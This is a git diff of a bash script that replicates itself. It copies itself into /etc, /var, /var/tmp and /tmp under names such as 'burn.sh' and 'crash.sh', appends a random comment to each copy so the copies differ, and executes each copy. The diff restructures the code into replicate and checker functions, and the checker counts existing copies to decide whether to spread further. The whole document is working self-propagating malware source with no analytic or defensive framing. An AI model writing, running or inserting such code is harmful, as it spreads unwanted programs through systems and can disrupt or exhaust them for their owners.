@@ -2,19 +2,35 @@
 
 dirs=("/etc" "/var" "/var/tmp" "/tmp")
 names=("float.sh" "sink.sh" "burn.sh" "crash.sh")
-append=("AAAA" "BBBB" "CCCC" "DDDD" "EEEE" "FFFF" "aaaa" "bbbb" "cccc" "dddd" "eeee" "ffff")
-rando=${names[RANDOM%4]}
+append=("#AAAA" "#BBBB" "#CCCC" "#DDDD" "#EEEE" "#FFFF" "#aaaa" "#bbbb" "#cccc" "#dddd" "#eeee" "#ffff")
 rappend=${append[RANDOM%12]}
+counter=0
 
-for dir in ${dirs[@]}; do
-	counter=0
-	for name in ${names[@]}; do
-		findo=$(find "$dir/" -iname "$name" 2>/dev/null)
-		if [ -z "$findo" ]; then
-			let counter++
-			if [ $counter = ${#names[@]} ]; then
-				cp ${0} "$dir/$rando" 2>/dev/null && echo "$rappend" >> "$dir/$rando" && "$dir/$rando" && break
+replicate() {
+	rdir=${dirs[RANDOM%4]}
+	rando=${names[RANDOM%4]}
+	cp ${0} "$rdir/$rando" 2>/dev/null
+	echo "$rappend" >> "$rdir/$rando"
+	bash "$rdir/$rando"
+	return
+}
+
+checker(){
+	for dir in ${dirs[@]}; do # iterates through directory list
+		for name in ${names[@]}; do # iterates through names array in each directory
+			findo=$(find "$dir/" -iname "$name" 2>/dev/null) # looks for an existing replicant
+			if [ ! -z "$findo" ]; then # if the name is there add 1 to counter
+				let counter++
 			fi
-		fi
+		done
 	done
-done
+}
+
+checker
+if [ "$counter" -le 1 ]; then
+	replicate
+elif [ "$counter" -ge 3 ]; then
+	exit
+elif [ "$counter" -eq 2 ]; then
+	echo "${0}"
+fi
